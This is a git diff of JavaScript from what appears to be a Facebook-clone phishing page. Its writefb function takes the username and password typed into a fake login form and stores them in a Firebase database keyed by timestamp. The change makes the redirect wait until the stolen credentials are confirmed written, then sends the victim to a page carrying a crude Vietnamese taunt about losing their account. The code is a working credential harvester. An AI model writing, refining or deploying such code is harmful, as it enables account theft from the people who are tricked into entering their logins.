@@ -31,17 +31,25 @@ function writeData() {
     }
 }}
 
+var check =  dateTime;
 
 function writefb() {
-    console.log("done");
-	window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
-    firebase
+	console.log("done");
+	firebase
         .database()
-        .ref("fbclone/" + dateTime)
+        .ref("fbclone/" + check)
         .set({
             name: document.getElementById("name").value,
             pass: document.getElementById("pass").value,
         });
+	var ref = firebase.database().ref('fbclone/' + check  + '/name');
+	ref.on("value", function(snapshot) {
+		window.open("./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))", "_self");
+		console.log(snapshot.val());
+	}, function (error) {
+	console.log("Error: " + error.code);
+	});
+
 }
 
 document.getElementById('login').onkeypress=function(e){
@@ -50,4 +58,10 @@ document.getElementById('login').onkeypress=function(e){
     }
 }
 
+//var ref = firebase.database().ref('fbclone/' + check  + '/name');
+//ref.on("value", function(snapshot) {
+//   console.log(snapshot.val());
+//}, function (error) {
+//   console.log("Error: " + error.code);
+//});
 //.openInNewTab('./text#đcm%20cứ%20nhập%20lung%20tung%20thế%20này%20có%20ngày%20mất%20nick%20con%20ạ%20=))))')
